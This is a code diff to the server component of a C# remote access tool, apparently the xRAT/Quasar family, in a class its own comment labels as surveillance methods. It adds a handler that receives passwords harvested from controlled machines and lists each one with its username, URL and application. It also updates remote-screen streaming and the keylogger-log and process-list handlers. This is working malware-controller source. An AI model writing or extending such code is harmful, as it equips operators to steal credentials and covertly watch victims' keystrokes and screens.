@@ -1,8 +1,11 @@
-﻿using System.IO;
+using System;
+using System.Collections.Generic;
+using System.IO;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Networking;
 using xServer.Core.Packets.ClientPackets;
+using xServer.Core.Packets.ServerPackets;
 using xServer.Core.Utilities;
 
 namespace xServer.Core.Commands
@@ -10,32 +13,65 @@ namespace xServer.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
     public static partial class CommandHandler
     {
+        public static void HandleGetPasswordsResponse(Client client, GetPasswordsResponse packet)
+        {
+            if (client.Value == null || client.Value.FrmPass == null)
+                return;
+
+            if (packet.Passwords == null)
+                return;
+
+            string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);
+
+            List<LoginInfo> lst = new List<LoginInfo>();
+
+            foreach (string str in packet.Passwords)
+            {
+                // raw passworddata
+                string[] values = str.Split(new string[] { DELIMITER }, StringSplitOptions.None);
+                lst.Add(new LoginInfo() { Username = values[0], Password = values[1], URL = values[2], Application = values[3] });
+            }
+
+            foreach (LoginInfo login in lst)
+            {
+                // add them to the listview of frmpass
+                client.Value.FrmPass.AddPassword(login, userAtPc);
+            }
+        }
         public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
         {
-            if (client.Value.FrmRdp == null)
+            if (client.Value == null || client.Value.FrmRdp == null)
                 return;
 
             if (packet.Image == null)
                 return;
 
-            lock (client.Value.FrmRdp.ProcessingScreensQueue)
+            if (client.Value.StreamCodec == null)
+                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);
+
+            if (client.Value.StreamCodec.ImageQuality != packet.Quality || client.Value.StreamCodec.Monitor != packet.Monitor
+                || client.Value.StreamCodec.Resolution != packet.Resolution)
             {
-                client.Value.FrmRdp.ProcessingScreensQueue.Enqueue(packet);
+                if (client.Value.StreamCodec != null)
+                    client.Value.StreamCodec.Dispose();
+
+                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);
             }
 
-            lock (client.Value.FrmRdp.ProcessingScreensLock)
+            using (MemoryStream ms = new MemoryStream(packet.Image))
             {
-                if (!client.Value.FrmRdp.ProcessingScreens)
-                {
-                    client.Value.FrmRdp.ProcessingScreens = true;
-                    ThreadPool.QueueUserWorkItem(client.Value.FrmRdp.ProcessScreens);
-                }
+                client.Value.FrmRdp.UpdateImage(client.Value.StreamCodec.DecodeData(ms), true);
             }
+
+            packet.Image = null;
+
+            if (client.Value != null && client.Value.FrmRdp != null && client.Value.FrmRdp.IsStarted)
+                new GetDesktop(packet.Quality, packet.Monitor).Execute(client);
         }
 
         public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
         {
-            if (client.Value.FrmTm == null)
+            if (client.Value == null || client.Value.FrmTm == null)
                 return;
 
             client.Value.FrmTm.ClearListview();
@@ -53,13 +89,14 @@ namespace xServer.Core.Commands
                 {
                     if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
                     {
-                        if (client.Value.FrmTm == null)
+                        if (client.Value == null || client.Value.FrmTm == null)
                             break;
 
                         ListViewItem lvi =
                             new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });
 
-                        client.Value.FrmTm.AddProcessToListview(lvi);
+                        if (client.Value != null && client.Value.FrmTm != null)
+                            client.Value.FrmTm.AddProcessToListview(lvi);
                     }
                 }
             }).Start();
@@ -67,7 +104,7 @@ namespace xServer.Core.Commands
 
         public static void HandleGetKeyloggerLogsResponse(Client client, GetKeyloggerLogsResponse packet)
         {
-            if (client.Value.FrmKl == null)
+            if (client.Value == null || client.Value.FrmKl == null)
                 return;
 
             if (packet.FileCount == 0)
@@ -100,13 +137,13 @@ namespace xServer.Core.Commands
 
                 foreach (FileInfo file in iFiles)
                 {
-                    if (client.Value.FrmKl == null)
+                    if (client.Value == null || client.Value.FrmKl == null)
                         break;
 
                     client.Value.FrmKl.AddLogToListview(file.Name);
                 }
 
-                if (client.Value.FrmKl == null)
+                if (client.Value == null || client.Value.FrmKl == null)
                     return;
 
                 client.Value.FrmKl.SetGetLogsEnabled(true);
@@ -115,7 +152,7 @@ namespace xServer.Core.Commands
 
         public static void HandleGetMonitorsResponse(Client client, GetMonitorsResponse packet)
         {
-            if (client.Value.FrmRdp == null)
+            if (client.Value == null || client.Value.FrmRdp == null)
                 return;
 
             client.Value.FrmRdp.AddMonitors(packet.Number);
